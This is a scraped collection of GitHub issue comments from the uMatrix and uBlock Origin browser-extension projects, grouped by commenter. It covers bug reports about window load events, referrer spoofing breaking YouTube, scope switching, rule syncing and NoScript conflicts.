suspect, that the first window sometimes already fired the \"load\" event, when I'm registering for that. At least that would explain my outcome.\nSo now I'm trying to find out how to test for the event having already been fired to call onWondowLoad directly. Or I could do the latter everytime in the loop's first iteration.\nEitherway, I'll report back. And btw, I didn't throw out the delay code, I keep that spiked with logging. In the end I want to know, if what I try is usefull.\n. It seems to work fine. I haven't tested excessively, but so far I only saw exactly one context menu entry per window. Same goes for the toolbar button. And the log shows no going down the delay codepaths.\nIf you want to take a look:\nhttps://gist.github.com/DjogaRo/15b6527ecdd6da278ec6\nTesting on legacy FF I'll do at a later time.\nI'm off to see Morpheus now.\n. I think I'll be home in one or two hours. I'll test it then.\n. There again were instances of the missing button. So I wanted to come back already knowing, where it comes from.\nI again added logging and a minor change to test my suspect - here's the diff (basis was uBO 1.3.2b5):\nhttps://gist.github.com/DjogaRo/c5764a5469c8c4be54be\nand a would have been problematic PM startup's logging output (the wording is not to be taken too seriously):\nhttps://gist.github.com/DjogaRo/b99b2ee995727d8ee176\n(the 3rd window is the browser console)\nWith the tests you apply to the results, the window watcher's enumerator gives you, you skip the window you are after. It's to early for the window to satisfy those tests - at least on my machine.\nUsing it exactly like the other one (enumerators) should do the trick. And why not Services.ww.getWindowEnumerator(chromeWindowType)?\nI guess it doesn't matter that early, but with the 2nd enumerator you change the ids of the windows you've already got.\n. I just made lots of exit-start with a new profile, my standard test scenario, and b6. As to be expected by now all went fine, seemingly no issue left. I did no logging with b6, but since what I tried in b5 and removing those evil test is equivelent, I'd say it's done.\nThanks so much for seeing this through. It takes away an annoying inconvenience for me that came with almost every browser startup bearing my bloated standard session. :)\nOn a sidenote still, out of curiosity: Why not getting rid of those delays? Are there supported hosts, that don't fire the \"load\" event for windows?\n. Alright. But I know it's coming and that's great.\nRegarding the delays, I'm not bothered with it's time aspect at all. I just think having one event handler for new windows registering a second event handler for adding what needs to be added is a much cleaner solution coding-wise. Given there is a proper event flying around. And I myself am pretty convinced the window's \"load\" event is damn appropriate. (It's not equivalent to DomContentLoaded, and not meant to be.)\nAnd with code cleanliness I'm bothered, because it helps with maintainability. Seeing you rotating taking care of issues, progressing the wiki and whatnot, I figure you need every bit of maintainability you can get. What I'm actually caring about is your ongoing well-being. :)\n. Well, it's your baby, so I don't expect you to do anything at all and I understand you're already busy as hell with your projects. But if you feel intrigued to and find the time to further reflect on this, I'll have elaborated :) :\nThat's a matter of perspective or paradigm, I guess. To me the first event handler has it's own proper job to do regarding new windows that pop into existence. In general that could be a lot of things - like making entries here or there, making it known/available to whatever, checking and manipulating its context, setting up rules for it, attaching functions or members to it, registering event handlers to its events or whatnot.\nThen there could be a lot of different EHs one might want to attach - onResize, onGainFocus, onReload, onClose... (don't know which actually are there).\nIn your case it's just an initial one-shot doing stuff within the new window. The question now is on what event to set it loose. The sensible thing of course is chosing an event that signals a certain state of the window's life cycle has been reached. So then one has to choose a state one wants to be reached.\nTo me it's just that the current choice is \"the window merely exists\" allowing the 2nd event handler (EH2) to be merged with EH1. But now one needs to check if the window's inner parts one wants to work on are already set up. Thus one might want to switch the state of choice to one guaranteeing those part's existence.\nwindow.document's DOMContentLoaded should - to my understanding - be just the one, but has proven not to be. The next one would be window's \"load\" event and it looks to me, that it is.\n\nGiven that the need for delaying is inevitable anyways, ...\n\nBeing event-driven is not the same as polling. ;)\nOne of the only two uncleanlynesses left would be having EH1 check if \"load\" is yet to be fired, thus the need to put the element attaching code in a function outside EH2, so that EH1 can execute it, instead.\nBut here I blame the API for not making sure all onOpenWindow handlers are done, before firing \"load\".\nThe other one comes from an uncomplete event system. You can't check if the window's \"load\" event already got fired. And I tried registering to window.document's \"load\" event, but I don't get one. On the other hand one can check window.document.readyState. If it's not \"complete\" or it is (\"loading\" or \"interactive\"), the window's \"load\" hasn't been fired yet. I don't know, if there's a gap between the document reaching \"complete\" and \"load being fired, but it doesn't matter as the document being complete suffices - the window's inner parts needed will be there.\n(BTW, DOMContentLoaded signals the change from \"loading\" to \"interactive\".)\n. Sounds like what I'm/was experiencing. I made it a topic here:\nhttp://forum.palemoon.org/viewtopic.php?f=26&t=10032\nDon't know about chrome, but could it be that you find that in FF settings (url: about:config) which start with \"browser.history.allow\" are set to false? If so, for me worked prohibiting XHR for youtube. Same goes for google and for github within projects. Though the workaround doesn't work for the latter completely.\nEdit: And just learned that said workaround prevents me from commenting here, dammit.\n. Never recognized that menu there. :) This workaround isn't a good solution for me either. My point was more about finding out, if those settings break it for you - or to rule that out, thus gaining information.\n. I see. Didn't know about that list. Thank you.\nNot an issue then.\n. ",
    "Symbai": "Or to use another addon where referrer-spoofing does not break the video playback.\nOr to use the stable 0.9.1.2 because there it does NOT break the video playback.\nOr to stop giving stupid answers and fix the problem?\nI've not signed up myself here to report an issue to hear if I have problems I should stop using the feature then. Just saying. It has worked before, it works on 0.9.1.2, it works with other addons providing the same feature. It does NOT work with the latest beta of uMatrix.\n. I haven't looked at this file. Guess its my mistake then, I apologize. So will you take a look on it?\n. ",
    "danieljl": "Same problem here. Firefox 41.0, Windows 8.1, referrer spoofing on.\nVersion 0.9.2.2b4 breaks YouTube, but when I switch back to 0.9.2.1, it works.\n. ",
    "L-a-n-g-o-l-i-e-r-s": "Hi there, I have the same issue when I enable spoofing it breaks HTML5 playback and YouTube reverts to flash after some time. I am using Firefox 41.0.1 on Windows 10 x64 with uMatrix 0.9.3.0rc1 with Referrer-Spoofing activated. When Referrer-Spoofing is disabled HTML5 playback works again on YouTube. \nI confirmed my rules are set up correctly and they're somewhat more liberal even. Here is the \"full\" log up to the moment it falls back to flash video (which is set for click to activate). I hope you find this information beneficial.\nThanks for your hard work!\nReferrer-Spoofing Enabled: uMatrix 0.9.3.0rc1\nhttp://pastebin.com/w0gj0gRV\nReferrer-Spoofing Disabled: (Working Correctly) uMatrix 0.9.3.0rc1\nhttp://pastebin.com/3XdJwxxL\nReferrer-Spoofing Enabled: (Working Correctly) uMatrix 0.9.2.1\nhttp://pastebin.com/u6yzFRSy\nIs it at all possible that the spoofing feature was broken on uMatrix 0.9.2.1 and the functionality was then fixed in this context? It also should be noted that for testing purposes the videos were allowed to buffer and not play, the first that defaulted to flash was in click to play mode and not allowed to buffer. No user agent overrides were used in any instance.\n. I should have elaborated, in no instances was I using a user agent override of any kind.\n. Right, but how does that effect the two different versions of uMatrix where one works on 41.0.1 and one doesn't? (in my set up anyway) Which brings me back to my question is it possible that uMatrix Referrer-Spoofing feature could have been broken for YouTube in 0.9.2.1?\nThanks\n. I am using HTTSPEverywhere, what you're saying still doesn't explain why every time 0.9.2.1 works with 41.0.1 and the other doesn't. If it is sending a different file because I'm using a different version of the extension, on the same version of the browser and windows then we have a real problem here I think.\n. requiressl=yes is in the same content link it is serving me, how about you post your log?\nAre you using any extensions/userscripts which change youtube prefs such as Youtube Center? What is your OS platform?\nThanks\n. https://github.com/gorhill/uMatrix/wiki/Per-scope-switches uMatrix has an option for per site basis via the 3 dot menu, so you don't have to fully disable the option. (Thanks gorhill)\n. I find doing that breaks websites very fast, so what I do is enable them for the sites than really want them and use self-destructing cookies to supplement umatrix.\n. You have a Spoof HTTP referrer string of third-party requests option in uMatrix, I'm asking if it's possible to exclude sites such as googlevideo/youtube from this feature while keeping it on for most other sites for compatibility. \nIs it fesable and or possible to make this a feature? Or if you could suggest an extensions capable of this that would be great to supplement uMatrix, thanks!\n. oh wow thanks, didn't realize there was a button there, appreciate it!\n. @gorhill I mean, when plugins are not allowed for a website via uMatrix and you have ask to activate enabled - you won't be prompted to activate that plugin in FF.\nIf you allow plugins for the domain with uMatrix, you are then asked if you want to activate that plugin on x site for y content.  How is this being accomplished when what I thought was responsible for this functionality was removed? Does the act of blocking plugins for a website in uMatrix keep the plugins from being fingerprinted but in a different manner?\nI hope that clears up the confusion, I can't think of any other way to explain it better.\nThanks\n@berrythesoftwarecodeprogrammar thanks for your reply, I will consider this, is user.js a firefox profile object? I am not interested in being in privacy mode 24/7 however, I didn't read too far but I hope there's an option to not do that. (Yes, I am now far from the scope of my question, apologies.)\nInteresting idea about the userscripts, you have tested that as valid and working?\nThanks\n. @berrythesoftwarecodeprogrammar I am using the user script from the original user, I use NoScript in allow globally for the other protections and I don't know if that would work, I also think editing ignore list for scripts are probably easier. Thanks\n. @berrythesoftwarecodeprogrammar is it as easy to add exceptions? good to know, thanks.\n. ",
    "marinmo": "I can confirm this bug, using Firefox 41.0.1, uMatrix 0.9.3.0rc1, however, in both cases for me youtube sends a webm, only that one doesn't play. I have no hard evidence, but I suspect it might have something to do with youtube not using SSL (secure connection) for the video data when using UA-spoofing, despite accessing youtube via HTTPS - the URIs used for sending video looks quite radically different (I can provide examples should you require them).\n. My post was not related to what you've been saying what-so-ever. gorhill already reported that FF41 plays fine with referrer-spoofing, while it does not for me. Also, I'm being served webm in both cases while you are being served mp4.\n. Sorry about that. Win10, I am using YTC. Disabling YTC still sends me webm video. Logs provided below:\nWithout UA spoofing:\nhttp://pastebin.com/k2tjr3uz\nWith UA spoofing:\nhttp://pastebin.com/eDibunwm\n. ",
    "mooglestiltzkin": "its shown here how to disable for youtube.com\nhttps://github.com/gorhill/uMatrix/wiki/Per-scope-switches\nbut i dont know whether this also applies for other sites that embed youtube. do we need to manually disable scope for those as well? Cause i run into a lot of forums like those :/\n. whats so hard about manually unblocking CDN from the list, then just do global for the CDN. (all other elements for 1st party site can be kept for local only. The only thing global is that CDN, which may be used for other sites as well). or you can even unblock but only for that specific site only. Problem solved....\n. to be fair those were rc1, this is final release :X ty for the link i can see whats going on. apparently it wasn't resolved still :{ unfortunately.\noh by the way the issue occurs in both stable and canary versions of chrome x64 on windows 10 \nhm gorhill said \"So essentially this means referrer spoofing breaks Youtube, so it will have to be disabled on Youtube.\" \nokay so we can selectively disable for youtube website. but whether this will apply for embeded youtubes on forums on other sites no idea :/ but i come across alot of those.\nhttps://github.com/gorhill/uMatrix/wiki/Per-scope-switches\n. ",
    "Drugoy": "Just wanted to leave some feedback: I feel like this was a sad decision to remove Origin header spoofing. Isn't there a way to fix the youtube's work without removing the spoofing?\n. How?. @Atavic Javascript can be blocked or get handled like in NoScript (it utilizes surrogates so that the script is working but doesn't report anything to anywhere).. ",
    "Misque": "not idea? :(\n. ",
    "scosist": "This would be nice to have, or at least a config setting to enable/disable the behavior.\n. ",
    "Gittyperson": "Thanks gorhill. I knew about this and pressing Esc is definitively better than using the mouse for closing the UI, but it can still become a very repetitive task at times.\n. Thanks for answering. Please note that it's not just the clicks that accumulate the time required. Also, the action would need to be reversed every time so it's 6 clicks vs 2.\nOf course, if nobody deems this useful there's no point. Thanks again.. @gorhill you are right, I forgot about the eraser, but: you'd still have to revert from global scope mode, so it's not really one click.. ",
    "ramschel": "I would love to see something along the lines of an option to enable auto-reload after a matrix change click. \n. ",
    "flyingzebras": "Thank you. I updated the post about this.\n. Issue moved to https://github.com/gorhill/uBlock/issues/744\n. @gorhill Thank you. I guess it is documented.\n. @vzjrz What is my best option if I use uBlock Origin in addition?\n. @gorhill I suggest that you add a pre-configuration button for that add * * * allow in My rules. What do you think?\n. @vzjrz * * * allow did it. Thank you very much.\n. @gorhill My idea was to make uMatrix enable/disable any add-on per site-basis. Do you understand?\n. @elypter I agree with you. I guess such add-on need a lot of permission though. Perhaps this mission could be something for the Firefox developers.\n. ",
    "ryanbnl": "@gorhill , I think that you should reopen this. adding support for wildcards would make uMatrix better. For example, Coursera use cloudfront and the urls use a random subdomain (xys.cloudfront.net). With the current uMatrix it's not possible to allow *.cloudfront.net on coursera.com.\nFor Coursera there are workaround, but for some sites there aren't - some sites appear to generate totally random subdomains on a per-request basis..\nI don't want to globally allow cloudfront.net - because I don't know what other sites are including on it.\n. With coursera there are just lots of them,  more appropriate are each week\nas new videos are added. So not random,  but it is annoying.\nI'm open to making a fix,  but only if there's a chance my PR would be\naccepted..\nOn Fri, 23 Oct 2015, 13:26 Berry The Software Code Programmar \nnotifications@github.com wrote:\n\nare you sure they have dynamic random subdomains? in my experience,\nwebsites which use cloudfront usually only have 1-3 randomized static\nsubdomains and whitelisting those individually the first time is enough.\nyou could also go into the umatrix settings and add a rule manually for it\nsince it wont be available in the popup\ncoursera.com cloudfront.net * allow\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/367#issuecomment-150547870.\n. I tried adding a wildcard rule but that didn't work. Which is why I'm\nsuggesting it :) All you need to do is support, say, * as wildcard for a\nrule and you're there. No UI changes, and hopefully a one-liner :)\n\nOn 23 October 2015 at 13:46, Berry The Software Code Programmar \nnotifications@github.com wrote:\n\ni dont think it will be. (sub)domains are displayed in umatrix based on\nthe public suffix list and gorhill wont change that. whats so hard about\nadding a rule in manually? that would fix coursera and cloudfront issues\nfor good\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/367#issuecomment-150551070.\n. Thanks @berrythesoftwarecodeprogrammar, that worked like a charm.\n\nSorry for dragging the discussion up, I don't like wasting fellow developer's time (I hate it myself).\n@gorhill,\nYou're right - or course it's not totally random - it'll be generated by some algorithm, probably as part of some partitioning/multi-tenant support. That the distinction doesn't really matter for my request :)\nThere still remains an edge-case for sites which include content from a range of IP, which are \"randomly\" chosen. But I only have one example (a certain streaming site) and it's not worth burdening the core engine with the overhead of regexes just to gain support for an extremely rare case. Then using AdBlock in a 2nd browser is the solution.\n. wow, that's fantastic. thanks @berrythesoftwarecodeprogrammar, I really appreciate the help :)\n. ",
    "Kangou": "Yep sorry, obviously my bookmark is going to https://www.parano.be/v15/desktop.php, not the root (then redirecting to login.php since i'm not logged).\n. ",
    "CounterPillow": "I've got a similar issue. When opening the site http://overviewer.org/~agrif/sigsample/ in a tab in which previously twitter was open, uMatrix shows fake requests for all twitter cookies. When opening the site in a new tab, those requests aren't there. The requests don't show up in the network console though, so they're not \"real\".\n. ",
    "hexaholic": "@CrisBRM Oops, I didn't know that. I'm still leaving this PR open for a while, just in case...\n@gorhill Let me know if you want me to close the request / close it yourself.\n. ",
    "Big--Mike": "Thank you for the hint, but I get the same error about Non-compatibility for uBlock Origin - it seems not to be compatible with Thunderbird, too.\n. No, I tried the version from addons.mozilla.org. I'll wait, until it's officially updated there.\n. ",
    "seafox": "@kreil\nNo mystery with http://uk.businessinsider.com/tony-robbins-how-to-defeat-donald-trump-2015-10\n1. enable these: cf.c.ooyala.com, ~~l.ooyala.com~~ opf.ooyala.com, player.ooyala.com\n2. enable script execution cell for code.jquery.com\nhttps://www.europcar.at/en/fleet displays blank pop-ups even on clicking even in IE, so the problem is on the site. Same experience as @vzjrz. Also, the New button here is the simple link and opens just fine.\nAs to manual rule insertion, its here too. One can click uMatrix toolbar button, click on popup window title bar to get Dashbord, then select My Rules tab, click Edit button on the right and enter whatever needed to. But, that's much more cumbersone than just use uBlock Origin to prohibit something, instead of trying to react on every broken page in uMatrix. Exchanging security for usability.\nJust my 2 cents.\n. @ebugusey yes, all #320, #358, #393, #405 have the same root. Am I getting it right the issue is not present on Chrom(ium) and is FF specific?\n. Seems like in 0.9.3.1 there is more strict/different rules than current devel. version rc2.\nI had not touched the rules except enabling referrer spoofing in rc2 - it worked OK.\nAfter installation of 0.9.3.1 release and enabling referrer spoofing YT videos work, but on some sites I do not see youtube background embedded images (i.e. the picture shown on youtube video canvas before playing video) in current FFox release. I see only the vidio title, big play icon in the center on black background. Example\n. @gorhill \nI have global domain * level YT enabled: www.youtube.com + frames AND s.ytimg.com + scripts.\nSee screenshot: http://i63.tinypic.com/5yeo1y.jpg and http://i65.tinypic.com/ip3vow.jpg\nNote: after browser restart it's 100% reproducible black background, but after some manipulations it might start to show the normal image background!\n. Yes, removing all UA strings with AppleWebKit fixes that. But then we have only 2 options for FF UAs - more required! Related thought: why not to make random UA selector to choose only FF containing strings automatically, w/out the need for users to hash them manually? Also, looks like all those problems are FF related as Chrome works fine also with AppleWebKit strings.\n. @gorhill\n1. Thanks for extra UA strings. Bad that they are excluded from any updates. Would you consider a chekbox option to keep (either restore or include) default UA strings to the existent user config?\n2. New included string Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 doesn't work with latest FF 32-bit release on Win7-x64 - check the same test link.\nStrange, but Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:41.0) Gecko/20100101 Firefox/41.0 works fine.\n. @the8472,\nLooks like you are essentially proposing changing ever evolving product line from uBlock Original to uMatrix to uCube or uMatrix3D...\n. ",
    "trienow": "The problem is not that this site stores the cookies, but other sites. The site I liked to only proves, that the Supercookie technic works. Other sites might be using this technic, but NOT disclosing it to the public. \n@RandomAcronym And what about other sites? I wouldn't want to block the cookie entirely. If this were a site one logs into, for instance Amazon, I would need to have the cookie enabled.\nMy actual question was, is there a way for \u00b5Matrix to differentiate between a HSTS Supercookie and a 'normal' cookie and have the option to reset it after a specific time period. \nI don't know my ins and outs of cookies so it might not be possible for a addon to do this. \nI am using chrome by the way. \n. Ok, thanks for the answer :)\n. ",
    "Niamor": "I can confirm this, same thing for me\n. It works as intended now, thank you.\n. Hello, sorry to bring this back up but it looks like the issue is not entirely fixed.\nimages from other extensions show as other. Browsing Reddit with RES. I don't have any other extensions that changes content of a page so can't test more.\nWorks fine on ublock origin.\n\n\n. Oh I didn't even see that there was two with the same url.\nIt indeed also shows as other in behind the scene in uBO.\nIt doesn't show the image though even if apparently according to the log the image is blocked then allowed, I don't really understand. What exactly is other?\nThank you.\n. ",
    "the-nothingman": "its still blocking ads properly but I also don't use Dynamic filtering since i use uMatrix \n. ok double checked uBO and its working as intended \n. ",
    "Kalthorn": "Ha, yeah, that obvious possibility didn't even occur to me.  After berry's comment I did some more testing and it seemed to be an intermittent problem with Nightly.  Thanks.\n. ",
    "ebugusey": "Is this related to #405 ?\n. @seafox as you can see from #405 in 0.9.3.1 referrer spoofing for Origin field has been disabled. So, it's not a problem now. You don't need to disable this feature for youtube.\n. > But then we have only 2 options for FF\nSee https://github.com/gorhill/uMatrix/wiki/Latest-user-agent-strings#firefox\n\nChrome works fine also with AppleWebKit strings\n\nBecause it is a webkit based browser. It sends same UA strings.\n. > whoer.net detects and flags your user agent as suspicious activity, because it can detect two different results\nWhat?\n\nIt's consistent for me.\nOnly two problems with UA spoofer that I see is this:\n\nand this:\n\n. ",
    "deathtrip": "Embedding another matrix into the default one, like in the image above, will just make the interface clogged and unintuitive.\n. ",
    "johnswolter": "If I can learn all the jargon, browser issues, discover my browsers' & uMatrix's theory of operations, problem descriptions, and solutions I might gain some useful information.   Oh wait.....I need to make money and get some sleep too..[wink, wink,...], sarcasm is alive in the English speaking world.\n. How would I override for one viewing this doubleclick monster,  this discussion reads like it could be related to this issue..\nhttps://googleads.g.doubleclick.net/aclk?sa=l&ai=C60uYDE0vWMmyH5aNmQTMiLLoC5-g-KNHkozMyPACwI23ARACIOP7kwMoAmDJvquJkKToD6ABhd-Z2wPIAQGoAwGqBJ4BT9Cp8dcASA8fSNslD2tadyK9-u9Jmdk6Os5-nM224clCkp7TzXxArh3a6l-Xrvo_XTSgMkc1g5dkU-ARxlSJuBPFHPI_WHXUYNF8hx9fO53LdBjoFc99t2LWm7supO9c1VMv4hxg47h8Fd4ViQ__knm4JAGTKGMaprD8O1DTS2xdmoJqjBAexQp0uHTMw1M3ViA8ldLCDMX2XEcfle2gBhrIBrv0s-vhAYAH46DmJKgHpr4b2AcB0ggFCMBhEAG4E-gB&num=2&cid=CAASSeRoz9i-cBUHZblMyzAAS7fubyYD7pn5RzTwiFxtNk1nZhVITVCY9tBFNxi7rCYgbYY3p8rycOLCNVAhqeoJakF_EXBycihspNQ&sig=AOD64_2oUkfNshBz5u_95VJeivl590yBlg&ctype=21&video_id=lm3JsPibKB4&client=ca-pub-6219811747049371&adurl=http://www.youtube.com/watch%3Fv%3Dlm3JsPibKB4\n. I'm seeing the same issue in Ggl Chrome(54.0.2840.99 m) & Chrome-64(54.0.2840.99 m) but it appears to be the blacklist area most times..  Usually, not always, only one line is displayed indicating a blacklist exists.  When expanded that list is not visible if the non-blacklist is near the tab's bottom.\nCould you respond with directions as how to generate the debug info you need\n. ",
    "skibbipl": "Yep, I have similar issues using self hosted tt-rss instance. When I open rss feed links in new tabs uMatrix looses scope.\n. I'm not observing this bug anymore with latest dev uMatrix build.\n. ",
    "rezad1393": "I have this issue.\n. to be exact , umatrix sets the scope to the last requested address from the tab. if it is a new address click for example by  click on a link that is opened in a new tab then the umatrix in first tab sets it scope to the scope of the address opened in the second tab.\nclick a new address in the first tab first set the scope to that and so on.\nthis doesnt happens if you use middle click for opening in new tab.\nthis become really obvious when using things like web rss readers like inoreader.\n. that is what I actually done so that I don't have to set my rules from scratch.\nbut it happened 2 times after that two.\nright now I don't know what triggers it.\nI just know that the first time it happened and it happened the first time just after updating to firefox 45.0.1\n. ",
    "hfa2010": "I also have this issue while using tt-rss hosted locally.\n. ",
    "Diazonium": "I can reproduce this issue, with the jsfiddle link, but not with the monoprice one.\n. Possibly yes, but this is just a random event that I managed to capture, so I do not know exactly what I have done to trigger it. So at the moment I cannot give instructions to reproduce, but I will keep an eye out for similar events and post an update when I can reproduce.\n. ",
    "TempSpas": "I can reproduce this pretty reliably on Firefox 42.0. I have Reddit as a pinned tab, and any time I click on a link that takes me to a different site in a new tab, returning to the pinned tab will replace the scope with that of the site I just opened.\n. ",
    "AlphaDelta": "This appears to still be affecting Pale Moon (I'm running 26.0.0 x64, uMatrix 0.9.3.2).\n\nSteps to reproduce:\n1. Open a new tab\n2. Navigate to google.com (Scope is now google.com)\n3. Perform search\n4. Click on search result\n5. Observe the scope changing to the website, then once the website has completed loading the scope returns to google.com\n. I managed to reproduce it on Pale Moon 25.8.1 (x64), however I then disabled all other extensions and then failed to reproduce it. I tested to see which combination of extensions was causing this and it turns out uBlock (not Origin) was causing this issue, I didn't realize I didn't have uBlock Origin installed. Replaced uBlock with uBlock Origin and everything's working now.\n. ",
    "JaneSmith": "I think I'm experiencing this bug on Ubuntu 16.04 with Firefox 48.0. It can be easily reproduced: simply open a web page in the browser, then drag that tab out into a new window. uMatrix will then display the scope as \"blank.about-scheme\", with no connections listed at all. The only other scope in the drop-down menu is the global scope. Refreshing the page corrects this.\n. ",
    "jhsagl4a": "Sorry, I forgot about it.\nFirefox 41.0.2. But at previous versions it didn't work either.\n. Last version 0.9.2.1\nThat mean button which is signed \"Disable/\u0435nable matrix filtering for this scope\" is pressed, and whole matrix is green.\nAnd this web-apps are working only if uMatrix is turned off in about:addons menu. And only after to reset the browser.\n. Oh, I understand now! Now you will can reproduce it!\nSee, I have a rule:\n* * script block\nIf you will make that rule and reset the browser (Firefox), https://uprootlabs.github.io/poly-flif/ won'l be working (and that is correct). But if you will add a temporary rule with matrix-menu like \nuprootlabs.github.io 1st-party script allow\nor\nuprootlabs.github.io * script allow\nIt is not working either (and that is incorrect)! But if you will make this rule to become a permanent one, and reset the browser - app will be working now.\nI am sorry for my English, it is not my native language.\n. > Are you refreshing the web page after you add the uprootlabs.github.io * script allow rule?\nYes. But app works only after making that rule to get permanent and reset the browser.\nTry to add only one rule\n* * script block\nnot all three at the same time. If you make all three rule at the same time bug will not reproduce.\nAnd if I am turning off the script with uMatrix at https://uprootlabs.github.io/poly-flif/ (even temporarily), they are not working so long as I will turn them permanently on and reset the browser.\n. \nOk, with that it does not work.\nStep one. I have only one important (for this bug) rule have * * script block\napp does not work (of course)\nStep two. I have added one temporary rule uprootlabs.github.io 1st-party script allow reload page and app does not work either (it is that bag)\nStep three. I have made that rule uprootlabs.github.io 1st-party script allow permanent and reset the browser. And it works now.\nStep four. I delete this rule, reload page and add this rule again, reload page. App does not work now, \n. This bug appears only if I reload page (after I change the rule) with firefox interface.\nIf I reload page with reload-button on uMatrix-menu, app works.\n. > Look at uMatrix logger and see what is reported in there.\nWhen I reproduced this bug, logger gave me that\n\nbecause I reload three times of course\n. \nand this after I reload with reload-button on uMatrix menu (above the red line), it works now\n. Anyway, I am very glad we understood each other now.\nWhen I found this bug I never use uMatrix's reload button. Now I can, and it is no longer a problem for me. Good luck in repairing, If this bug able to be repaired, of course.\n. Also, you could delete the label unable to reproduce because you know, you can do it now.\n. Not all sites have https. I want to allow 1st-party scripts only from https-sites.\n. MitM-active-attack is exactly a replacement of scripts.\n. This rule allows 1st-party scripts only through https.\nAnd first rule blocks all scripts\n* * script block\n. I want to block flash but allow svg. Can I do that with uMatrix?\nIt might be a feature request.\n. .svg and .swf both count as plugins.\nand if I use\n* * plugin block\nboth are blocked\nI want to block swf and don't block svg\n. ok. ",
    "user65478": "\nIt's already implemented. You only have to look at the release page.\n--> https://github.com/gorhill/uMatrix/releases\n. ",
    "Jokler": "http://www.nooooooooooooooo.com/\nHow did i even miss that?\n. ",
    "grrrrr": "facepalm yes I did\n. ",
    "phanimahesh": "This is a great idea! Sharing rules will be good. I was planning to track my rules in git, but discovered that though rules can have comments, the moment they are saved all comments are stripped.\nOnly slightly to this issue, but my rules should probably have an append-only mode for settings from the popup and should retain comments so that it can an import followed by export retains the file structure.\n. That would work, but the ability to modify rules directly from the popup gives a much greater flexibility.\n. Fixed in 0031a477217c74d89cf7806155b1446780768542. Can be closed\n. ",
    "pjvandehaar": "Thanks for explaining that.\nIt seems odd that I set * 1st-party * allow, a global-scope rule, but it is only evaluated by the site scope.  If this makes sense in the implementation, that's fine I guess.\nAnyways, thanks bunches for uBlock/uMatrix.\n. Thanks, this makes sense now.\n. ",
    "EgorkaSanyok": "I haven't tried setting those values to false, but blocking XHR for youtube prevents expanding the menu on the left using the menu button. Even if it could work on youtube, I'd rather not have this tradeoff :smile:\n. ",
    "number5": "Sorry, missed the important bits:\nGoogle Chrome   46.0.2490.80 (Official Build) (64-bit)\nRevision    c6bfd1395b9449cb59180d45944a8cb56799bd9c-refs/branch-heads/2490@{#549}\nOS  Mac OS X 10.11.2\nBlink   537.36 (@c6bfd1395b9449cb59180d45944a8cb56799bd9c)\nJavaScript  V8 4.6.85.28\n. I'm not doing git clone each time, just git pull\nBut I did move the parent directory to elsewhere and use symlink to keep the path, i.e. physical location changed from /Users/bruce/src/git/uMatrix/dist/build/uMatrix.chromium to /Volumes/Data/home/src/git/uMatrix/dist/build/uMatrix.chromium\nSo uMatrix use the extension path as a key to store my data? \n. @gorhill that make sense :) feel free to close this ticket.\nAnd thanks for all the hard works, I really like uMatrix/uBlock\n. ",
    "garack666": "There is a new Sync Feature in Umatrix with Version 9.3.0. I can upload MyRules to the Google Account. I wanted to use this Feature, because i have two Computers. This Computers both Have Latest Chrome Browser installed with the same Google Account and Google Sync is active.\nIn this way i can sync for example My Bookmarks between two Computers.\nThe same Sync i wanted for Umatrix. SO i installed latest UMatrix 0.9.3.1 on both Chrome Browsers. I enabled Sync on both. Now When i upload My Rules to the Google Cloud with PC1 and dowload it with PC1 all works fine. \nBut when i upload my Rules with PC1 and download it with PC2 nothing happens. PC2 dont get the Rules, the rules on PC2 just stays the same.\n. OK nice, push it ro Chrome store, i really like Umatrix, Best Blocker ever (would be even better to block specific Ressources from one URL) , i assume it takes some time, cause Google have to check the addon?\n. Wow very nice! Many thinks and i wish you success with this extension. I and many others reccomend this in it tech forums often, hope it helps!\n. ",
    "laniakea64": "Hi, I'm actually the original reporter (thanks ThrawnCA for helping me out until I could sign up here).  I'm not sure it was made clear that this is specifically an interaction between \u00b5Matrix and NoScript, and both addons are important part of STR.\n1) set up NoScript to allow scripts on youtube.com, but make sure [s.]ytimg.com is not Allowed\n2) set up \u00b5Matrix to block all \"plugin\"\n3) force Flash on youtube by changing browser UA string to something \"too old\" - say, Firefox 22\n4) open any youtube video\n5) Temp-Allow s.ytimg.com in NoScript\nExpected results: plugin content from the network is blocked - that is, Flash runs but cannot load anything, so that area stays blank.\nActual results: the youtube video player (Flash object) loads, but the video doesn't load: you see all the player controls and the player says \"An error occurred. please try again later\".  Looking at the logger shows the request is seen to be from \"behind-the-scene:\", for which filtering is disabled...\n. SeaMonkey 2.39\n. Seems fixed by \u00b5Matrix 0.9.3.3\nThanks :smiley: \n. > What is the state of things regarding this issue with WebExtensions ?\nIt's the same.  This is just as much an issue in uMatrix/webext as it was in uMatrix/legacy.\n(btw I'm actually the original reporter.  Thanks ThrawnCA for helping me with this until I could sign up on Github \ud83d\udc4d ). I can confirm this is fixed in https://github.com/gorhill/uMatrix/commit/b2e760f40d3c4201d18655dc597342b4376eaa72 with the setting imagePlaceholder false.  Thank you gorhill! \ud83d\ude04 . Adding this rule looks to fix it:\nmatrix-off: internal-scheme true\nIs that an actual solution or just a workaround?\n. Now that you mention it I seem to recall something about NoScript cloning channels but can't remember exactly what (or when).  Any suggestions what to search for in the NoScript code?\n. Unfortunately for debugging, that \"Enable ABE\" checkbox in practice disables more than just ABE itself...\nJust looking through the code I'm not seeing what would cause this.  I'll play around with this some and post back if I find anything useful.\n. I don't seem to be able to reproduce the issue either with SeaMonkey or with Firefox 46.0.1.  Can please clarify the instructions \"Close a browser\" and \"Open a browser\" - does \"browser\" refer to a browser tab, browser window, the whole application, or..?  Also, is there something special about the cookie testing page on raymondhill.net and/or accessing from Github that makes this impossible to reproduce on a local server?\n(In case it could be platform-specific, I'm running Linux x86_64)\n. Thanks gorhill, I can reproduce the issue in SeaMonkey with that set of steps-to-reproduce (on the last step, forcing reload from uMatrix).\nApparently this is not due to a recent change in NoScript - I'm getting the same result with every NoScript version that actually works with a modern browser.  I'll try debugging NoScript a bit, see if I can find where exactly the data is getting lost...\n. Been trying to see if it's possible to resolve this with a patch to NoScript, haven't cracked this one so far although I did find out that if I cause an error in the initialization code for ABERequest objects then the issue goes away (but probably at the expense of borking NoScript, despite the total lack of any error messages)\nI'll see if we can bring Giorgio in this if I don't solve it soon.\n. Oh, I'm not doing that kind of debugging, I just modify the xpi and insert dump() calls in 